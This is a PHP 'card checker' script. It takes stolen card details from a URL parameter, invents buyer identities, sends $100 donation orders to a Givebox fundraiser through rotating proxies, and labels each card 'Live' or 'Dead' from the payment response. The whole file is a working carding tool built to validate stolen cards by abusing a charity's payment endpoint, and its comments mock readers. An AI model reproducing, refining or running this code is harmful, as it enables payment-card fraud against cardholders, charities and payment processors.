<?php
set_time_limit(0);
error_reporting(0);
extract($_GET);
function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
$seperator = explode("|", $check);
$cc = $seperator[0];
$ano = $seperator[2];
$mes=$seperator[1];
$cvv = $seperator[3];
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $name = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];


$username = 'user:proxy';
$password = 'password:proxy';
$port = 22225;
$session = mt_rand();
$super_proxy = 'proxy:url';
$url1 = 'https://api.givebox.com/v2/orders';
$url2 = 'https://donorbox.org/donation';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url1);
curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"items":[{"ID":null,"articleID":906,"articleKind":"fundraiser","amount":100,"sourceType":"embed","sourceLocation":"http://www.jackshelpinghand.org/donate/","passFees":false,"interval":"once","note":{"value":"","message":"","emails":[]}}],"customer":{"firstName":"'.$name.'","lastName":"'.$last.'","email":"'.$email.'","phone":"7603382833","occupation":null,"employer":null,"address":{"name":"juan perez lopez","line1":"4033 Roosevelt Road","city":"Cottonwood Falls","state":"Choose State","zip":"10111"}},"paymethod":{"number":"'.$cc.'","type":"","name":"juan perez lopez","expMonth":'.$mes.',"expYear":'.$ano.',"isDebit":false,"cvv":"'.$cvv.'"},"emailBlastToken":""}');
$page = curl_exec($ch);
if(substr_count($page, 'incorrect') > 0){
echo '<span class="label label-danger">Dead - '.$check.' - Invalid card number, y no es scam perro'.'#TESTE CHECKER PRO<br></span>';
exit();
}
curl_close($ch);
$message = trim(strip_tags(getstr($page,'"code":"','"')));
if(substr_count($page, "Card Declined") > 0){echo '<span class="label label-danger">Dead - '.$check.' - '.$message.''.'#TESTE CHECKER PRO<br></span>';}
if(substr_count($page, "Invalid Account Number") > 0){echo '<span class="label label-danger">Dead - '.$check.' - '.$message.''.'#TESTE CHECKER PRO<br></span>';}
if(substr_count($page, "Processing Network Unavailable") > 0){echo '<span class="label label-danger">Dead - '.$check.' - '.$message.''.'#TESTE CHECKER PRO<br></span>';}
if(substr_count($page, "Do Not Honor") > 0){echo '<span class="label label-danger">Dead - '.$check.' - '.$message.''.'#TESTE CHECKER PRO<br></span>';}
if(substr_count($page, "Restricted Card") > 0){echo '<span class="label label-danger">Dead - '.$check.' - '.$message.''.'#TESTE CHECKER PRO<br></span>';}
if(substr_count($page, "Expired Card") > 0){echo '<span class="label label-danger">Dead - '.$check.' - '.$message.''.'#TESTE CHECKER PRO<br></span>';}
if(substr_count($page, "Lost/Stolen Card") > 0){echo '<span class="label label-danger">Dead - '.$check.' - '.$message.''.'#TESTE CHECKER PRO<br></span>';}
if(substr_count($page, "no_authorization") > 0){echo '<span class="label label-danger">Dead - '.$check.' - '.$message.''.'#TESTE CHECKER PRO<br></span>';}
if(substr_count($page, "completed") > 0){echo '<span class="label label-success">Live - '.$check.' - '.$message.''.'#TESTE CHECKER PRO<br></span>';}
if(substr_count($page, "bad request") > 0){    $seperator2 = explode("0", $seperator[1]);
    $mes = $seperator2[1];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL,$url1);
    curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"items":[{"ID":null,"articleID":906,"articleKind":"fundraiser","amount":100,"sourceType":"embed","sourceLocation":"http://www.jackshelpinghand.org/donate/","passFees":false,"interval":"once","note":{"value":"","message":"","emails":[]}}],"customer":{"firstName":"juan perez","lastName":"lopez","email":"cscr23iz@ke1.nl","phone":"7603382833","occupation":null,"employer":null,"address":{"name":"juan perez lopez","line1":"4033 Roosevelt Road","city":"Cottonwood Falls","state":"Choose State","zip":"10111"}},"paymethod":{"number":"'.$cc.'","type":"","name":"juan perez lopez","expMonth":'.$mes.',"expYear":'.$ano.',"isDebit":false,"cvv":"'.$cvv.'"},"emailBlastToken":""}');
    $page = curl_exec($ch);
    if(substr_count($page, 'incorrect') > 0){
    echo '<span class="label label-danger">Dead - '.$check.' - Invalid card number, y no es scam perro'.'#TESTE CHECKER PRO<br></span>';
    exit();
    }
    curl_close($ch);
    $message = trim(strip_tags(getstr($page,'"code":"','"')));
    if(substr_count($page, "Card Declined") > 0){echo '<span class="label label-danger">Dead - '.$check.' - '.$message.''.'#TESTE CHECKER PRO<br></span>';}
    if(substr_count($page, "Invalid Account Number") > 0){echo '<span class="label label-danger">Dead - '.$check.' - '.$message.''.'#TESTE CHECKER PRO<br></span>';}
    if(substr_count($page, "Processing Network Unavailable") > 0){echo '<span class="label label-danger">Dead - '.$check.' - '.$message.''.'#TESTE CHECKER PRO<br></span>';}
    if(substr_count($page, "Do Not Honor") > 0){echo '<span class="label label-danger">Dead - '.$check.' - '.$message.''.'#TESTE CHECKER PRO<br></span>';}
    if(substr_count($page, "Restricted Card") > 0){echo '<span class="label label-danger">Dead - '.$check.' - '.$message.''.'#TESTE CHECKER PRO<br></span>';}
    if(substr_count($page, "Expired Card") > 0){echo '<span class="label label-danger">Dead - '.$check.' - '.$message.''.'#TESTE CHECKER PRO<br></span>';}
    if(substr_count($page, "Lost/Stolen Card") > 0){echo '<span class="label label-danger">Dead - '.$check.' - '.$message.''.'#TESTE CHECKER PRO<br></span>';}
    if(substr_count($page, "no_authorization") > 0){echo '<span class="label label-danger">Dead - '.$check.' - '.$message.''.'#TESTE CHECKER PRO<br></span>';}
    if(substr_count($page, "completed") > 0){echo '<span class="label label-success">Live - '.$check.' - '.$message.''.'#TESTE CHECKER PRO<br></span>';}




}
//As you can see, legit tong checker to kaya putang ina kau.
?>